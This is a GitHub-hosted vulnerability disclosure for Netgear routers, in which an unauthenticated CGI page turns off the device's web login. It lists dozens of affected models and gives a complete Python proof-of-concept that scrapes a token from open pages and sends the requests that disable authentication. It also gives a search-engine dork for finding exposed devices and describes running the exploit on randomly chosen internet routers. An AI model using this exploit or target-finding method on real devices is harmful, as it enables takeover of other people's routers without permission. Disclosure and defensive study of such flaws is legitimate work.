=== Content from github.com_9dff5ced_20250121_011020.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzer0yu%2FCVE_Request%2Fblob%2Fmaster%2Fnetgear%2Fnetgear_cgi_unauthorized_access_vulnerability.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzer0yu%2FCVE_Request%2Fblob%2Fmaster%2Fnetgear%2Fnetgear_cgi_unauthorized_access_vulnerability.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=zer0yu%2FCVE_Request)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zer0yu](/zer0yu)
/
**[CVE\_Request](/zer0yu/CVE_Request)**
Public

* [Notifications](/login?return_to=%2Fzer0yu%2FCVE_Request) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2Fzer0yu%2FCVE_Request)
* [Star
   14](/login?return_to=%2Fzer0yu%2FCVE_Request)

* [Code](/zer0yu/CVE_Request)
* [Issues
  0](/zer0yu/CVE_Request/issues)
* [Pull requests
  0](/zer0yu/CVE_Request/pulls)
* [Actions](/zer0yu/CVE_Request/actions)
* [Projects
  0](/zer0yu/CVE_Request/projects)
* [Security](/zer0yu/CVE_Request/security)
* [Insights](/zer0yu/CVE_Request/pulse)

Additional navigation options

* [Code](/zer0yu/CVE_Request)
* [Issues](/zer0yu/CVE_Request/issues)
* [Pull requests](/zer0yu/CVE_Request/pulls)
* [Actions](/zer0yu/CVE_Request/actions)
* [Projects](/zer0yu/CVE_Request/projects)
* [Security](/zer0yu/CVE_Request/security)
* [Insights](/zer0yu/CVE_Request/pulse)

## Files

 master
## Breadcrumbs

1. [CVE\_Request](/zer0yu/CVE_Request/tree/master)
2. /[netgear](/zer0yu/CVE_Request/tree/master/netgear)
/
# netgear\_cgi\_unauthorized\_access\_vulnerability.md

Copy path Blame  Blame
## Latest commit

## History

[History](/zer0yu/CVE_Request/commits/master/netgear/netgear_cgi_unauthorized_access_vulnerability.md)executable file·165 lines (115 loc) · 5.41 KB master
## Breadcrumbs

1. [CVE\_Request](/zer0yu/CVE_Request/tree/master)
2. /[netgear](/zer0yu/CVE_Request/tree/master/netgear)
/
# netgear\_cgi\_unauthorized\_access\_vulnerability.md

Top
## File metadata and controls

* Preview
* Code
* Blame

executable file·165 lines (115 loc) · 5.41 KB[Raw](https://github.com/zer0yu/CVE_Request/raw/refs/heads/master/netgear/netgear_cgi_unauthorized_access_vulnerability.md)
## 0x00 Summary

There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off.
Some devices need to set the correct token and send a POST type request to trigger the vulnerability.

like

```
POST http://target/genieDisableLanChanged.cgi?id=Token

```

Token values can be fetched from certain pages that do not require authorization. But different models are different, so it is difficult to find a general solution. In this PoC, I try to grab a Token from three pages, which is suitable for most situations.

## 0x01 Tested Versions

AC1450, D8500, DC112A, JNDR3000, LG2200D, R4500, R6200, R6200V2, R6250, R6300, R6300v2, R6400, R6700, R6900P, R6900, R7000P, R7000, R7100LG, R7300, R7900, R8000, R8300, R8500, WGR614v10, WN2500RPv2, WNDR3400v2, WNDR3700v3, WNDR4000, WNDR4500, WNDR4500v2, WNR1000, WNR1000v3, WNR3500L, WNR3500L

## 0x02 PoC instructions

If you use PoC's closeauth function to turn off the device's web authentication, you must call PoC's openauth function to restore device authentication within a few minutes, otherwise the device's web service may crash.

If the PoC is invalid for a certain target, the possible reasons are:
（1）The target does not exist in the genieDisableLanChanged.cgi page, returning 404 (no vulnerability exists)
（2）The target's genieDisableLanChanged.cgi page requires authorization and returns 401 (no vulnerability exists)
（3）The page prompts that the timestamp expires and returns 200. (There is a vulnerability, the correct token is not fetched, and secondary development is required.)

## 0x03 PoC

```
#!/usr/bin/env python

import sys
import time
import os
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "Token maybe unnecessary"

def get_token(url):
	token=0
	while token==0:
		req = requests.get(url, verify=False)
		token = scrape(req.text, 'unauth.cgi?id=', '\"')
		if token=="Token maybe unnecessary":
			#print url+'genie_ping.htm'
			req = requests.get(url+'genie_ping.htm', verify=False)
			token = scrape(req.text, 'genieping.cgi?id=', '\"')
			if token=="Token maybe unnecessary":
			#print url+'genie_ping.htm'
				req = requests.get(url+'LGO_logout.htm', verify=False)
				token = scrape(req.text, 'logout.cgi?id=', '\"')

	return token

def get_url(ip,port):
	url = 'http://' + ip + ':' + port + '/'
	try:
		req = requests.get(url)
	except:
		url = 'https://' + ip + ':' + port + '/'
	return url

def close_auth(token,url):

	if token == "Token maybe unnecessary":
		vurl = url + 'genieDisableLanChanged.cgi'
	else:
		vurl = url + 'genieDisableLanChanged.cgi?id=' + token

	req = requests.post(vurl, verify=False)
	time.sleep(1)
	req = requests.post(vurl, verify=False)

	print 'Authentication is disabled'
	print 'Try: '+url+'BAS_basic.htm'
	print 'Try: '+url+'MNU_accessPassword_recovered.htm'

def open_auth(token,url):

	if token == "Token maybe unnecessary":
		vurl = url + 'geniemanual.cgi'
	else:
		vurl = url + 'geniemanual.cgi?id=' + token

	req = requests.post(vurl, verify=False)
	time.sleep(1)
	req = requests.post(vurl, verify=False)

	print 'Authentication is enabled'
	print 'Try: '+url+'BAS_basic.htm'
	print 'Try: '+url+'MNU_accessPassword_recovered.htm'

if __name__ == '__main__':
	if len(sys.argv) != 4:
		print 'usage:'
		print '1.python router.py ip port openauth'
		print '2.python router.py ip port closeauth'
		os._exit(0)

	ip=sys.argv[1]
	port=sys.argv[2]
	func=sys.argv[3]

	if func=='openauth':
		url=get_url(ip, port)
		token=get_token(url)
		open_auth(token,url)
	elif func=='closeauth':
		url=get_url(ip, port)
		token=get_token(url)
		close_auth(token,url)
	else:
		print 'usage:'
		print '1.python router.py ip port openauth'
		print '2.python router.py ip port closeauth'
		os._exit(0)
```

## 0x04 Vulnerability test example

Use the fofa search engine to retrieve the target, such as using the following dork syntax to get the target of the specified version.

```
dork: app="NETGEAR-WNDR3400v2"

```

[![7ef9ce61dd1875f9961000dd3889fe0c](/zer0yu/CVE_Request/raw/master/netgear/img/FC66A914-B18A-473F-B5B3-F798B015D3AA.png)](/zer0yu/CVE_Request/blob/master/netgear/img/FC66A914-B18A-473F-B5B3-F798B015D3AA.png)
Next randomly select the target to use poc to test it. First, the access to the target directly needs to be authenticated. If the authentication is not authenticated, the corresponding page cannot be accessed.

![aca54fddbac415e49f12d4f24721e096](img/屏幕快照 2019-07-15 下午2.27.37.png)
[![f851678f7fd85d7a5a2454d38b6bebe5](/zer0yu/CVE_Request/raw/master/netgear/img/2896ACAC-346B-4466-A703-E22AEC18B046.png)](/zer0yu/CVE_Request/blob/master/netgear/img/2896ACAC-346B-4466-A703-E22AEC18B046.png)

Next use PoC to turn off authentication and access key pages.

[![2031c33b0f3e6937620a0151d9af1392](/zer0yu/CVE_Request/raw/master/netgear/img/50A84184-249E-44D9-85D1-6E33539CCEBD.png)](/zer0yu/CVE_Request/blob/master/netgear/img/50A84184-249E-44D9-85D1-6E33539CCEBD.png)

[![77179e57d9f8e5a333c50efd04453d1b](/zer0yu/CVE_Request/raw/master/netgear/img/24791329-A503-44BF-9F39-6C57E4FC16F6.png)](/zer0yu/CVE_Request/blob/master/netgear/img/24791329-A503-44BF-9F39-6C57E4FC16F6.png)

[![7d2e74f998fadcf41c3e42c749b83cec](/zer0yu/CVE_Request/raw/master/netgear/img/C4B57C60-41F7-4FC0-B6A3-1707A301C89D.png)](/zer0yu/CVE_Request/blob/master/netgear/img/C4B57C60-41F7-4FC0-B6A3-1707A301C89D.png)

Then use PoC to open the corresponding authorization and try to access the corresponding page again, and find that authorization is required to access.

[![d1e26ba59ff297439edea6d328d9be72](/zer0yu/CVE_Request/raw/master/netgear/img/F5DFD014-9A93-4404-A60C-3AD4F3BB9833.png)](/zer0yu/CVE_Request/blob/master/netgear/img/F5DFD014-9A93-4404-A60C-3AD4F3BB9833.png)

[![0108d5e52391baae09eb694cbf193752](/zer0yu/CVE_Request/raw/master/netgear/img/74A49081-BC7D-4DD4-81A4-2F745F383D6E.png)](/zer0yu/CVE_Request/blob/master/netgear/img/74A49081-BC7D-4DD4-81A4-2F745F383D6E.png)

## 0x05 Acknowledgement

Thanks to the partners who discovered the vulnerability together：

z3

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


